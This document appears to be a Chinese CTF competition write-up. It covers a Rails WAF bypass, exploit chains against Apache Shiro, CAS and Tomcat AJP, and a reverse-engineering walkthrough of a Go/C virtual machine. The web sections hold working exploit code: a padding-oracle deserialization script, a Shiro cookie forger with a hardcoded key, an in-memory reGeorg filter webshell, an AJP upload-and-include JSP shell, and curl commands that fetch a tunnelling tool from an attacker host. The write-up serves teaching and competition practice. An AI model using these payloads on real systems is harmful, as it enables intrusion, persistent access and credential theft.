ua1xjb25zb2xlXE91dHB1dCI6Mjp7czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7cjo1O3M6OToiACoAc3R5bGVzIjthOjE6e2k6MDtzOjc6ImdldEF0dHIiO319fXM6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6IjEyMyI7fX19fX0
先删除任意非txt文件后直接上传php马即可获得flag
#### 条件竞争
大多数选手选择了条件竞争，那么也是相同的思路，一直生成一句话木马然后一直访问，这里就不过多阐述

### One step to get flag
题目的确比较脑洞，其中抽象的漏洞模型在现实世界的Rails应用中不太可能出现（至少出题人没有见过这个场景）。

让我们梳理一下题面。访问`/getflag`会被WAF ban掉，而带入参数`debug={HEADER_PAIR}`，则`HEADER_PAIR`被注入到响应头中。根据hint1，路由DSL如下：
```ruby=
 Waf::Engine.routes.draw do
    get '*all', to: 'requests#block'
  end

  get 'getflag', to: 'application#getflag'

```

当Rails匹配到WAF的路由，则交给WAF处理，而WAF本身拦截对任意路径的请求，对`/getflag`路径的请求处理后将不再交给`application`控制器处理。因此，我们的目的是让路由命中:
```ruby=
get 'getflag', to: 'application#getflag'
```
。在真实环境中，恐怕不会有WAF作为一个Rails Engine存在，不管是从性能还是代码复杂度上考虑，更实际的形式是Rack中间件，例如`Rack::Attack`。

响应头注入显然存在于WAF中。hint2提醒我们去寻找Rails路由中的一些约定，这也是最难被找到的地方。这个约定可在Rails[对路由处理的源码](https://github.com/rails/rails/blob/c7620bb9dee7f217f45a511a5d14e12c803c9e94/actionpack/lib/action_dispatch/journey/router.rb#L52)中找到:
```ruby=
 status, headers, body = route.app.serve(req) # 将请求交给Rails app并获取响应信息

  if "pass" == headers["X-Cascade"]
    req.script_name     = script_name
    req.path_info       = path_info
    req.path_parameters = set_params
    next
  end
```
当Rails应用处理完请求后，路由调度器检查响应头中是否存在值为`pass`的键`X-Cascade`（需显式指定），如果有，则继续搜索下一条匹配规则的路由，若找到另一条，则交由对应的应用处理。因此，如果我们通过响应头注入漏洞注入`X-Cascade`到WAF响应中，则Rails继续搜索下一条路由，
```ruby=
get 'getflag', to: 'application#getflag'
```
将被命中，WAF也被绕过了，这里简单过滤了一下'-'，不过在rails里请求头键连接符可以用下划线代替，最终获取到flag。

### Login Me
第一步padding oracle

```python
from jose import jws
from Crypto.Cipher import AES
from cStringIO import StringIO
from multiprocessing.pool import ThreadPool
import time
import requests
import base64
import zlib
import uuid
import binascii
import json
import subprocess
import requests
import re

start_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

iv = uuid.uuid4().bytes
header_mode = '\x00\x00\x00\x22\x00\x00\x00\x10{iv}\x00\x00\x00\x06aes128'

JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'
URL= "http://ip:port/login"


headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/x-www-form-urlencoded"}

cookies = {"JSESSIONID":"ADF6653ED3808BE63B052BCED53494A3"}

def base64Padding(data):
	missing_padding = 4 - len(data) % 4
	if missing_padding and missing_padding != 4:
		data += '=' * missing_padding
	return data

def compress(data):
	gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16)
	data = gzip_compress.compress(data) + gzip_compress.flush()
	return data

def bitFlippingAttack(fake_value, orgin_value):
	iv = []
	for f, o in zip(fake_value, orgin_value):
		iv.append(chr(ord(f) ^ ord(o)))
	return iv

def pad_string(payload):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	return pad(payload)

def send_request(paramsPost,w):
	response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=False)
	return w, response

def paddingOracle(value):
	fakeiv = list(chr(0)*16)
	intermediary_value_reverse = []
	for i in range(0, 16):
		num = 16
		response_result = []

		for j in range(0, 256-num+1, num):
			jobs = []
			pool = ThreadPool(num)
			for w in range(j, j + num):
				fakeiv[N-1-i] = chr(w)
				#print(fakeiv)
				fake_iv = ''.join(fakeiv)
				paramsPost = {"execution":"4a538b9e-ecfe-4c95-bcc0-448d0d93f494_" + base64.b64encode(header + body + fake_iv + value),"password":"admin","submit":"LOGIN","_eventId":"submit","lt":"LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org","username":"admin"}
				job = pool.apply_async(send_request, (paramsPost,w))
				jobs.append(job)

			pool.close()
			pool.join()

			for w in jobs:
				j_value, response = w.get()
				#print(response)
				if response.status_code == 200:
					print("="*5 + "200" + "="*5)
					response_result.append(j_value)
		print(response_result)

		if len(response_result) == 1:
			j_value  = response_result[0]
			intermediary_value_reverse.append(chr((i+1) ^ j_value))
			for w in range(0, i+1):
				try:
					fakeiv[N-w-1] = chr(ord(intermediary_value_reverse[w]) ^ (i+2))
				except Exception as e:
					print(fakeiv, intermediary_value_reverse, w, i+1)
					print(base64.b64encode(value))
					print(e)
					exit()
			print(fakeiv)
		else:
			print(response_result)
			print("Exit Because count of is " + str(len(response_result)))
			exit()
		print("="*5 + "sleep" + "="*5)
		time.sleep(1)

	intermediary_value = intermediary_value_reverse[::-1]
	return intermediary_value

def pad_string(payload):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	return pad(payload)

if __name__ == '__main__':
	popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient2', 'your_ip:your_port'],stdout=subprocess.PIPE)
	payload = popen.stdout.read()
	payload = pad_string(compress(payload))

	excution = "input_excution"

	body = base64.b64decode(excution)[34:]
	header = base64.b64decode(excution)[0:34]
	iv = list(header[8:24])

	N=16

	fake_value_arr = re.findall(r'[\s\S]{16}', payload)
	fake_value_arr.reverse()

	value = body[-16:]

	payload_value_arr = [value]
	
	count = 1
	all_count = len(fake_value_arr)
	print(all_count)
	for i in fake_value_arr:
		intermediary_value = paddingOracle(value)
		print(value, intermediary_value)
		fakeIv = bitFlippingAttack(intermediary_value, i)
		value = ''.join(fakeIv)
		payload_value_arr.append(value)

		print(count, all_count)
		count += 1


	fakeiv = payload_value_arr.pop()
	payload_value_arr.reverse()

	payload = header_mode.format(iv=fakeiv) + ''.join(payload_value_arr)
	print(base64.b64encode(payload))

	end_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
	print(start_time,end_time)
	f = open('/tmp/cas.txt', 'w')
	f.write(base64.b64encode(payload))
	f.close()
```
跑出jrmp，然后fuzz gadget可以发现JDK7u21，可以打。
```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8899 Jdk7u21 'cmd'
```
![](https://i.loli.net/2020/07/08/BWZpvqOfDTAiL7t.png)

查询连接字符串

```bash
cat /usr/local/apache-tomcat-7.0.104/webapps/ROOT/WEB-INF/deployerConfigContext.xml
```
![](https://i.loli.net/2020/07/08/qgleWBram5UTyXP.png)

做代理
```
curl http://ip:8000/frpc -o /tmp/frpc
curl http://ip:8000/frpc.ini -o /tmp/frpc.ini
chmod +x frpc
./frpc -c frpc.ini
```

```
proxychains mysql -h 172.19.0.3 -u cas -p8trR3Qxp -e 'select * from cas.sso_t_user'
```

![](https://i.loli.net/2020/07/08/KRqM9i1VwXPxGtN.png)
登陆即可看到flag



### Login Me Aagin
题目附件直接给了完整的Docker环境，外部是Nginx反代出来的Spring Boot应用，反编译jar包由pom文件很容易发现存在Shiro 1.2.4 反序列化漏洞和commons-beanutils链，但题目环境不出网，flag在内网机器中，所以需要先建立代理，我觉得最好的方式就是动态注册filter或者servlet，并将reGeorg的代码嵌入其中，但如果将POC都写在header中，肯定会超过中间件header长度限制，当然在某些版本也有办法修改这个长度限制，参考[基于全局储存的新思路 | Tomcat的一种通用回显方法研究](https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247484799&idx=1&sn=42e7807d6ea0d8917b45e8aa2e4dba44)，以下采用了动态加载类的方式将代理的主要逻辑放入了POST包体中

除了建立socks5代理对内网应用进行攻击外，在靶机上留有nc，可以本地抓包Ajp协议，再通过nc发送
#### 改造ysoserial
为了在ysoserial中正常使用下文中提到的类，需要先在pom.xml中加入如下依赖

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
    <version>8.5.50</version>
</dependency>

<dependency>
	<groupId>org.springframework</groupId>
	<artifactId>spring-web</artifactId>
	<version>2.5</version>
</dependency>
```


要让反序列化时运行指定的Java代码，需要借助TemplatesImpl，在ysoserial中新建一个类并继承AbstractTranslet，这里有不理解的可以参考[有关TemplatesImpl的反序列化漏洞链](https://l3yx.github.io/2020/02/22/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/#TemplatesImpl)

静态代码块中获取了Spring Boot上下文里的request，response和session，然后获取classData参数并通过反射调用defineClass动态加载此类，实例化后调用其中的equals方法传入request，response和session三个对象

```java
package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class MyClassLoader extends AbstractTranslet {
    static{
        try{
            javax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();
            java.lang.reflect.Field r=request.getClass().getDeclaredField("request");
            r.setAccessible(true);
            org.apache.catalina.connector.Response response =((org.apache.catalina.connector.Request) r.get(request)).getResponse();
            javax.servlet.http.HttpSession session = request.getSession();

            String classData=request.getParameter("classData");
            System.out.println(classData);

            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(classData);
            java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",new Class[]{byte[].class, int.class, int.class});
            defineClassMethod.setAccessible(true);
            Class cc = (Class) defineClassMethod.invoke(MyClassLoader.class.getClassLoader(), classBytes, 0,classBytes.length);
            cc.newInstance().equals(new Object[]{request,response,session});
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
    }
    public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
    }
}
```



然后在ysoserial.payloads.util包的Gadgets类中照着原有的createTemplatesImpl方法添加一个createTemplatesImpl(Class c)，参数即为我们要让服务端加载的类，如下直接将传入的c转换为字节码赋值给了_bytecodes

```java
public static <T> T createTemplatesImpl(Class c) throws Exception {
    Class<T> tplClass = null;

    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        tplClass = (Class<T>) Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
    }else{
        tplClass = (Class<T>) TemplatesImpl.class;
    }

    final T templates = tplClass.newInstance();
    final byte[] classBytes = ClassFiles.classAsBytes(c);

    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        classBytes
    });

    Reflections.setFieldValue(templates, "_name", "Pwnr");
    return templates;
}
```



最后复制CommonsBeanutils1.java的代码增加一个payload CommonsBeanutils1_ClassLoader.java，再把其中

```java
final Object templates = Gadgets.createTemplatesImpl(command);
```

修改为

```java
final Object templates = Gadgets.createTemplatesImpl(ysoserial.MyClassLoader.class);
```



打包

```java
mvn clean package -DskipTests
```



借以下脚本生成POC

```python
#python2
#pip install pycrypto
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

key  =  "kPH+bIxk5D2deZiIxcaaaA=="
mode =  AES.MODE_CBC
IV   = uuid.uuid4().bytes
encryptor = AES.new(base64.b64decode(key), mode, IV)

payload=base64.b64decode(sys.argv[1])
BS   = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
payload=pad(payload)

print(base64.b64encode(IV + encryptor.encrypt(payload)))
```

```bash
python2 shiro_cookie.py `java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1_ClassLoader anything |base64 |sed ':label;N;s/\n//;b label'`
```

#### 改造reGeorg
对于reGeorg服务端的更改其实也就是request等对象的获取方式，为了方便注册filter，我直接让该类实现了Filter接口，在doFilter方法中完成reGeorg的主要逻辑，在equals方法中进行[filter的动态注册](https://xz.aliyun.com/t/7388)

```java
package reGeorg;

import javax.servlet.*;
import java.io.IOException;

public class MemReGeorg implements javax.servlet.Filter{
    private javax.servlet.http.HttpServletRequest request = null;
    private org.apache.catalina.connector.Response response = null;
    private javax.servlet.http.HttpSession session =null;

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    public void destroy() {}
    @Override
    public void doFilter(ServletRequest request1, ServletResponse response1, FilterChain filterChain) throws IOException, ServletException {
        javax.servlet.http.HttpServletRequest request = (javax.servlet.http.HttpServletRequest)request1;
        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse)response1;
        javax.servlet.http.HttpSession session = request.getSession();
        String cmd = request.getHeader("X-CMD");
        if (cmd != null) {
            response.setHeader("X-STATUS", "OK");
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = request.getHeader("X-TARGET");
                    int port = Integer.parseInt(request.getHeader("X-PORT"));
                    java.nio.channels.SocketChannel socketChannel = java.nio.channels.SocketChannel.open();
                    socketChannel.connect(new java.net.InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    response.setHeader("X-STATUS", "OK");
                } catch (java.net.UnknownHostException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                } catch (java.io.IOException e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try{
                    socketChannel.socket().close();
                } catch (Exception ex) {
                }
                session.invalidate();
            } else if (cmd.compareTo("READ") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = response.getOutputStream();
                    while (bytesRead > 0){
                        so.write(buf.array(),0,bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                    so.flush();
                    so.close();
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                }

            } else if (cmd.compareTo("FORWARD") == 0){
                java.nio.channels.SocketChannel socketChannel = (java.nio.channels.SocketChannel)session.getAttribute("socket");
                try {
                    int readlen = request.getContentLength();
                    byte[] buff = new byte[readlen];
                    request.getInputStream().read(buff, 0, readlen);
                    java.nio.ByteBuffer buf = java.nio.ByteBuffer.allocate(readlen);
                    buf.clear();
                    buf.put(buff);
                    buf.flip();
                    while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                    response.setHeader("X-STATUS", "OK");
                } catch (Exception e) {
                    response.setHeader("X-ERROR", e.getMessage());
                    response.setHeader("X-STATUS", "FAIL");
                    socketChannel.socket().close();
                }
            }
        } else {
            filterChain.doFilter(request, response);
        }
    }

    public boolean equals(Object obj) {
        Object[] context=(Object[]) obj;
        this.session = (javax.servlet.http.HttpSession ) context[2];
        this.response = (org.apache.catalina.connector.Response) context[1];
        this.request = (javax.servlet.http.HttpServletRequest) context[0];

        try {
            dynamicAddFilter(new MemReGeorg(),"reGeorg","/*",request);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

        return true;
    }

    public static void dynamicAddFilter(javax.servlet.Filter filter,String name,String url,javax.servlet.http.HttpServletRequest request) throws IllegalAccessException {
        javax.servlet.ServletContext servletContext=request.getServletContext();
        if (servletContext.getFilterRegistration(name) == null) {
            java.lang.reflect.Field contextField = null;
            org.apache.catalina.core.ApplicationContext applicationContext =null;
            org.apache.catalina.core.StandardContext standardContext=null;
            java.lang.reflect.Field stateField=null;
            javax.servlet.FilterRegistration.Dynamic filterRegistration =null;

            try {
                contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);
                stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(name, filter);
                filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{url});
                java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, null);
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }catch (Exception e){
                ;
            }finally {
                stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);
            }
        }
    }
}
```



编译后使用如下命令得到其字节码的base64

```bash
cat MemReGeorg.class|base64 |sed ':label;N;s/\n//;b label'
```

在Cookie处填入 rememberMe=[ysoserial生成的POC]，POST包体填入classData=[MemReGeorg类字节码的base64]，注意POST中参数需要URL编码，发包
![](https://i.loli.net/2020/07/08/7tpOMQGolAZwFUD.png)



然后带上`X-CMD:l3yx`header头再请求页面，返回`X-STATUS: OK`说明reGeorg已经正常工作
![](https://i.loli.net/2020/07/08/9yc7wxlfUKW3sqr.png)


reGeorg客户端也需要修改一下，原版会先GET请求一下网页判断是否是reGeorg的jsp页面，由于这里是添加了一个filter，正常访问网页是不会有变化的，只有带上相关头才会进入reGeorg代码，所以需要将客户端中相关的验证去除

在askGeorg函数第一行增加return True即可


连接reGeorg
![](https://i.loli.net/2020/07/08/CNmEqX1h6ordTti.png)

#### Ajp协议绕过Shiro权限控制
接入代理后已经可以成功访问内网，然后根据Dockerfile或者提示文件很容易找到内网WEB应用

http://sctf2020tomcat.syclover:8080/login
![](https://i.loli.net/2020/07/08/LNGC7tmIyvhabM2.png)


内网中该版本的Tomcat存在Ajp文件包含漏洞，可上传文件并包含getshell，但是文件上传接口有Shiro进行权限控制

使用Ajp协议绕过的方法，参考:

https://issues.apache.org/jira/browse/SHIRO-760

[https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/#0x05-%E6%83%85%E5%86%B5%E5%9B%9B%EF%BC%9Ashiro%E7%8E%AF%E5%A2%83%E4%B8%8B](https://gv7.me/articles/2020/how-to-detect-tomcat-ajp-lfi-more-accurately/#0x05-情况四：shiro环境下)


借助[AJPy库](https://github.com/hypn0s/AJPy)，最后文件上传+文件包含的POC:

```python
import sys
import os
from io import BytesIO
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
from tomcat import Tomcat

#proxy
import socks
import socket
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 8081)
socket.socket = socks.socksocket

target_host = "sctf2020tomcat.syclover"
gc = Tomcat(target_host, 8009)

filename = "shell.jpg"
payload = "<% out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(\"cat /flag.txt\").getInputStream())).readLine()); %>"

with open("./request", "w+b") as f:
    s_form_header = '------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name="file"; filename="%s"\r\nContent-Type: application/octet-stream\r\n\r\n' % filename
    s_form_footer = '\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n'
    f.write(s_form_header.encode('utf-8'))
    f.write(payload.encode('utf-8'))
    f.write(s_form_footer.encode('utf-8'))

data_len = os.path.getsize("./request")

headers = {  
        "SC_REQ_CONTENT_TYPE": "multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti",
        "SC_REQ_CONTENT_LENGTH": "%d" % data_len,
}

attributes = [
    {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.request_uri", "/;/admin/upload", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.path_info", "/", )
    }
    , {
        "name": "req_attribute"
        , "value": ("javax.servlet.include.servlet_path", "", )
    }
, ]

hdrs, data = gc.perform_request("/", headers=headers, method="POST",  attributes=attributes)

with open("./request", "rb") as f:
    br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)
    responses = br.send_and_receive(gc.socket, gc.stream)

r = AjpResponse()
r.parse(gc.stream)

shell_path = r.data.decode('utf-8').strip('\x00').split('/')[-1]
print("="*50)
print(shell_path)
print("="*50)

gc = Tomcat(target_host, 8009)

attributes = [
    {"name": "req_attribute", "value": ("javax.servlet.include.request_uri", "/",)},
    {"name": "req_attribute", "value": ("javax.servlet.include.path_info", shell_path,)},
    {"name": "req_attribute", "value": ("javax.servlet.include.servlet_path", "/",)},
]
hdrs, data = gc.perform_request("/uploads/1.jsp", attributes=attributes)
output = sys.stdout

for d in data:
    try:
        output.write(d.data.decode('utf8'))
    except UnicodeDecodeError:
        output.write(repr(d.data))

```
![](https://i.loli.net/2020/07/08/JQoFhOf8Ex52Wdj.png)



## reverse

### flag_detector
#### 出题思路
关键位置是一个vm， 是五月做出来的一个简单实现函数调用的vm小项目改出来的题目，六月以后的两次比赛看到了golang的web服务二进制文件逆向，也学习了下，
于是增加了些难度，将原本的vm更改为一个c语言的接口， 由golang调用，而外层的golang则通过gin实现了一个web服务，跑在本地 localhost:8000/ ，可以直接使用浏览器访问，
于是应该要先逆golang，也算简单，然后check位置，调用cgocall的参数是c接口，指针指向应该要调用的函数，c写的，然后分析是一个vm， 逆出来opcode，然后逻辑也比较简单，就是异或和减法。
> 应该，也算是比较有意思的题目吧，
> 题解部分的目录：
![](https://i.loli.net/2020/07/08/jHGOMK6U2ebTzQV.png)


#### 题解
下载题目， elf 64位f文件， 运行一下， 是这个样子， 打印了一堆东西， 大致是说一个叫gin的引擎，

![](https://i.loli.net/2020/07/08/cKnB294Ya6jROLp.png)
同时应该是看到了upx， 然后直接upx -d就ok，

#### gin -路由 参数

然后ida里， 可以知道是个golang写的， 恢复下符号， 直接可以看到main_main， 里面也是多个符号都是`github_com_gin_gonic_gin_`的字样， 其实和前面这个gin的字样对的上， 可以查一下github， 这个是一个golang的web服务框架， 这个似乎是github上也是比较高星的golang的web框架， 然后可以简单看到相关的教程等，

应该先看看，相关路由， 对应参数， 先了解一下怎么玩嘛。

在二进制文件中， 处理符号以后基本可以看到相关的包和函数， 接着恢复恢复字符串， 大体都如下面这个例子，有路由组`/v3`， 路由地址`/check` ，还有个指针指向对应处理函数。
![](https://i.loli.net/2020/07/08/jWQCydifzwLrtb5.png)

于是基本可以恢复出来路由，

```python
/  
			main_main_func1

/v1 
			main_main_func2
		/login  main_main_func3

/v2
			main_main_func4
		/user   main_main_func5
		/flag   main_main_func6

/v3  
			main_main_func7
		/check  main_main_func8
```

注意这个， gin对于路由组也可以设置对应函数， 然后进入这个路由组先执行， 这样实现一定的权限控制， 所以可以得到上面这样的路由，

而且可以得到端口：

![](https://i.loli.net/2020/07/08/uOyf6iSnrB9xl7o.png)

然后可以考虑， 调试和逆一下参数，

这里简单说几个函数的意义：

func1  就是打印一段信息， 我们进入对应端口可以得到：

func3 :  可以看到`DefaultQuery`函数， 这个是指定参数并且没有参数会给一个默认值， 参数是name。后面是解析为json然后写入到文件`'./config'`内，然后写入以后有一个提示信息。

func4: 这是进入/v2路由组时运行的函数， 判断文件./config是否存在， 如果存在则继续向下进入对应路由。

func5: 这个没有参数， 主要是将一堆东西写入了个文件， 然后打印出提示信息，这个是对应提示和文件内容。

![](https://i.loli.net/2020/07/08/Vo5y7lXbvCKTd4Q.png)

func5： 参数为flag， 写入到hjkl文件内，
![](https://i.loli.net/2020/07/08/d2Y317895hHMzEf.png)


fun7: 检测是否存在asdf 和hjkl两个文件，如果存在则进入路由组v3

func8: 路由组v3中的check， 调用了一个函数，然后根据这个函数的返回值，回显错误或者正确，这里就是check的位置。

![](https://i.loli.net/2020/07/08/q7eut5f3UBPwMTY.png)

#### check

然后去看看这个check函数的逻辑好了， 

![](https://i.loli.net/2020/07/08/qNEC83YPdejKrow.png)


cgocall， go调用一个c语言的接口， 参数中的指针是真正会调用的函数， 然后主要看到是函数machine在进行验证， 这些都是c语言写的了， 可以直接反编译出来，

![](https://i.loli.net/2020/07/08/IfNVzoBTR18QqGn.png)

里面调用的函数，首先是调用check_fun1， 参数为'./asdf'文件名， 主要是打开了这个文件并处理， 

check_fun2函数主要进行了一些初始化。

![](https://i.loli.net/2020/07/08/w8AbWJZYvgO2UEI.png)


然后是check_fun3函数，进去是个for循环，check_fun5只是取值， 然后check_func6里面是一个switch循环，这里看出来是一个虚拟机， 

然后调试基本可以看出来一些栈， 栈顶指针之类的，一个基于栈的虚拟机， 

主要写几个重要的位置， 在这个vm中，也比较有意思的东西，

#### function

可能会比较奇怪的两个指令调用， chunk_func9, 

![](https://i.loli.net/2020/07/08/RZKpPhFM4drDxV9.png)


10号指令， 这里面是在保存栈当前的ip等信息， 然后更新了opcode和栈的内容， 是一个函数调用的实现， 

11号指令是一个函数返回， 恢复之前调用时保存下来的栈等数据，

然后关于函数运行的opcode其实是根据10号指令的参数去在func_list中查找的， 

这个func_list在处理文件时建立， 文件中， -1到-2之间定义为一个函数，在一串虚拟指令里，从fun[0] 到fun[n]排开， 默认从fun[0]开始运行，并后面的调用都是依据这个号检索到func_list中对应的函数。

#### register

既然有了函数的话， 也就做了个传参的东西，不过做的也是挺简陋的， 

主要就是两个全局变量，reg_a和reg_b， 然后将栈顶值复制给reg_a/b， 和将reg_a/b压入栈， 就相当于一个传参和传返回值了，

这里的20,21指令是关于reg_a的， 26,27号指令是reg_b，  

![](https://i.loli.net/2020/07/08/EFJytIgA5WQRjYv.png)


#### flag处理

这里简单写一下对于字符串的处理。

首先读入flag，原本是scanf后面改成了读文件内的，都是字符串。然后将flag处理到一个数组内，这个数组会保持以1结束，这样配合后面有个检查长度的实现，


#### break

不知道有师傅用到没有， 其实是一个小的辅助， 这个28号指令就不做任何事情，可以在ida这里下断，然后在opcode的文件'./asdf'中， 某些位置插入这个指令，用来快速断到相关的位置，
![](https://i.loli.net/2020/07/08/apFuYxKbcf69m5U.png)

当然，这里也就是辅助调试的一个位置，无关解题。在opcode中也没出现。

#### 返回值

这个位置分散的函数太多了， 关于check以后返回正确与否的问题， 使用了个全局变量，虚拟机会赋值这个变量， 最后返回到go的部分会把这个值返回过去。29号指令。


#### opcode

这里简单列出来所有opcode和参数，

```c
typedef enum {
    nop,    	 // 0			停止虚拟机运行
    pop,     	 // 1			弹出栈顶值(栈顶指针-1)
    push,    	 // 2+var		将var压栈
    jmp,    	 // 3+var		跳转到相对偏移var的位置(var可以为负数，为向前跳转，一般为循环的结构)

    jmpf,  	 // 7+var		如果栈顶值不为0则跳转到偏移var的位置
    cmp,  	 // 8+var		比较栈顶值和var并将结果0/1压入栈。

    call,        // 10+index	        按照index索引调用对应的函数
    ret,         // 11			函数返回

// 基于栈的运算=> 将栈顶两值弹出，运算，结果压栈
    add,         // 12			加法
    sub,         // 13			减法

    xor,         // 17			异或
    
    read,        // 18			从文件./hjkl中读入flag，并转化到一个数组内。
    printc,      // 19			putchar(TOP1)
    stoA,        // 10			reg_a = TOP1
    lodA,        // 21			push reg_a
    pushflag,    // 22			push flag[TOP1]
    popflag,     // 23			flag[TOP2] = Top1
    Dpush,       // 24			push TOP1

    stoB,        // 26			reg_b = TOP1
    lodB,        // 27			push reg_b
    nopnop,      // 28			调试辅助指令
    set_var_ret  // 29 		赋值整个check的返回值， ret=reg_a
} opcode;
```

#### 逻辑

这里写一下opcode和对应的逻辑：

```python
# -1 10 1 10 4 10 5 2 1 20 10 3 11 -2 
def main():
	fun1()
	fun4()
	fun5()
	fun3(1)

# -1 18 11 -2 
def fun1():
	read_flag()

# -1 2 1 22 8 1 7 6 1 2 1 12 3 -11 1 2 1 13 20 11 -2 
def fun2():
	a = 1
	while(flag[a] != 1):
		a += 1
	return a-1;

# -1 29 0 11 -2 
def fun3(reg_a):
	ret = reg_a
	exit()

# -1 10 2 21 8 22 7 5 2 2 20 10 3 1 2 1 8 23 7 9 24 20 10 6 2 1 12 3 -13 11 -2 
def fun4():
	a = fun2()
	if (a != 22):
		fun3(2)
	for i in range(1, 23, 1):
		fun6(i)

''' -1 
2 1  26 2 73   20 10 7 
2 2  26 2 89   20 10 7 
2 3  26 2 70   20 10 7 
2 4  26 2 84   20 10 7 
2 5  26 2 -111 20 10 7 
2 6  26 2 116  20 10 7 
2 7  26 2 103  20 10 7 
2 8  26 2 124  20 10 7 
2 9  26 2 121  20 10 7 
2 10 26 2 102  20 10 7 
2 11 26 2 99   20 10 7 
2 12 26 2 42   20 10 7 
2 13 26 2 124  20 10 7 
2 14 26 2 77   20 10 7 
2 15 26 2 121  20 10 7 
2 16 26 2 123  20 10 7 
2 17 26 2 43   20 10 7 
2 18 26 2 43   20 10 7 
2 19 26 2 77   20 10 7 
2 20 26 2 43   20 10 7 
2 21 26 2 43   20 10 7 
2 22 26 2 111  20 10 7 
11 -2 '''
